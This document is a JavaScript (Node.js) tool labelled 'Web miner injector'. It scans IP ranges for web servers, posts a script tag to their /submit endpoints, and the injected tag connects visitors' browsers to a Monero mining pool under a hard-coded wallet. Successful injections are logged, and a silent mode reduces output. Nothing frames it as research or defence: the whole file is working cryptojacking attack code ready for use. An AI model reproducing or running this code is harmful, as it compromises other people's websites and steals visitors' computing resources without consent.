const axios = require('axios');
const argparse = require('argparse');
const winston = require('winston');
const os = require('os');

// Configure logging
const logger = winston.createLogger({
    level: 'info',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.printf(({ timestamp, level, message }) => `${timestamp} - ${level.toUpperCase()}: ${message}`)
    ),
    transports: [
        new winston.transports.File({ filename: 'miner.log' }),
        new winston.transports.Console()
    ]
});

// Resource mode configurations
const MODE_CONFIGS = {
    low: {
        threads: 10, // 10% of max 100 threads
        delay: 1000, // 1000ms delay
        mode: 'low'
    },
    medium: {
        threads: 30, // 30% of max 100 threads
        delay: 500, // 500ms delay
        mode: 'medium'
    },
    high: {
        threads: 50, // 50% of max 100 threads
        delay: 250, // 250ms delay
        mode: 'high'
    }
};

// Base configuration
const CONFIG = {
    POOL_URL: 'wss://webminer.moneroocean.stream:443',
    WALLET_ADDRESS: '4ADHEMYrLqrHQvaQNVoKh28Vt6gttrckp2kfum6eYWK7FWbmRjFT7rzacpbr6MiXYMMBUxFcGpYor2i2jgQKTZiMZ4QwBjop9',
    ATTACKER_IP: '10.0.0.242',
    ATTACKER_PORT: '8080',
    TIMEOUT: 5000,
    SUCCESS_LOG: 'exploit_success_log.txt'
};

// Generate WebSocket payload
function generateWebSocketPayload() {
    const workerId = `m${Math.random().toString(36).slice(2)}`;
    return JSON.stringify({
        type: 'login',
        params: {
            wallet: CONFIG.WALLET_ADDRESS,
            worker: workerId,
            algo: 'cn-pico',
            threads: -1
        }
    });
}

// Generate malicious script
function generateMaliciousScript() {
    const encodedPayload = Buffer.from(generateWebSocketPayload()).toString('base64');
    return `
        <script>
            var ws = new WebSocket('${CONFIG.POOL_URL}');
            ws.onopen = function() {
                ws.send(atob('${encodedPayload}'));
            };
        </script>
    `;
}

// Check if target is vulnerable
async function checkVulnerability(target, modeConfig) {
    try {
        const response = await axios.get(`http://${target}`, {
            timeout: CONFIG.TIMEOUT,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
        });
        const content = response.data.toLowerCase();
        return content.includes('javascript') || content.includes('form') || content.includes('spring');
    } catch (error) {
        return false;
    }
}

// Inject miner
async function injectMiner(target, modeConfig) {
    try {
        const payload = generateMaliciousScript();
        const response = await axios.post(`http://${target}/submit`, {
            data: payload
        }, {
            timeout: CONFIG.TIMEOUT,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
        });
        if (response.status === 200 && response.data.includes(payload)) {
            logger.info(`Injected miner at ${target} (mode: ${modeConfig.mode})`);
            logExploitSuccess(target, modeConfig.mode, true);
            return true;
        }
        return false;
    } catch (error) {
        logger.debug(`Failed to inject miner at ${target}: ${error.message}`);
        logExploitSuccess(target, modeConfig.mode, false);
        return false;
    }
}

// Log exploit success
function logExploitSuccess(target, mode, success) {
    const fs = require('fs');
    const status = success ? 'Success' : 'Failure';
    fs.appendFileSync(CONFIG.SUCCESS_LOG, `${new Date().toISOString()} - Injection at ${target}: ${status} (Mode: ${mode})\n`);
}

// Scan IP range
async function scanIpRange(ipRange, modeConfig, silent) {
    const [baseIp, subnet] = ipRange ? ipRange.split('/') : ['10.0.0', '24'];
    const baseParts = baseIp.split('.');
    const start = 1;
    const end = subnet === '24' ? 255 : subnet === '16' ? 65535 : 256;
    const targets = [];

    for (let i = start; i <= Math.min(end, start + 255); i++) {
        targets.push(`${baseParts[0]}.${baseParts[1]}.${baseParts[2]}.${i}:80`);
    }

    logger.info(`Starting scan in ${modeConfig.mode} mode (threads=${modeConfig.threads}, delay=${modeConfig.delay}ms)`);

    const semaphore = require('async-sema');
    const sem = new semaphore(modeConfig.threads);

    const scanPromises = targets.map(async (target) => {
        await sem.acquire();
        try {
            const isVulnerable = await checkVulnerability(target, modeConfig);
            if (isVulnerable) {
                if (!silent) logger.info(`Vulnerable target found: ${target}`);
                await injectMiner(target, modeConfig);
            }
        } finally {
            sem.release();
        }
        await new Promise(resolve => setTimeout(resolve, modeConfig.delay));
    });

    await Promise.all(scanPromises);
}

// Main
async function main() {
    const parser = new argparse.ArgumentParser({ description: 'Web miner injector' });
    parser.addArgument('--mode', { choices: ['low', 'medium', 'high'], default: 'medium', help: 'Mining mode: low (10%), medium (30%), or high (50%) resource usage' });
    parser.addArgument('--ip-range', { default: '10.0.0', help: 'IP range to scan (e.g., 10.0.0/24)' });
    parser.addArgument('--silent', { action: 'storeTrue', help: 'Run in silent mode (minimal logging)' });

    const args = parser.parseArgs();
    const modeConfig = MODE_CONFIGS[args.mode];

    if (args.silent) {
        logger.transports.forEach(transport => {
            if (transport instanceof winston.transports.Console) {
                transport.silent = true;
            }
        });
    }

    await scanIpRange(args.ip_range, modeConfig, args.silent);
}

main().catch(error => {
    logger.error(`Main error: ${error.message}`);
    process.exit(1);
});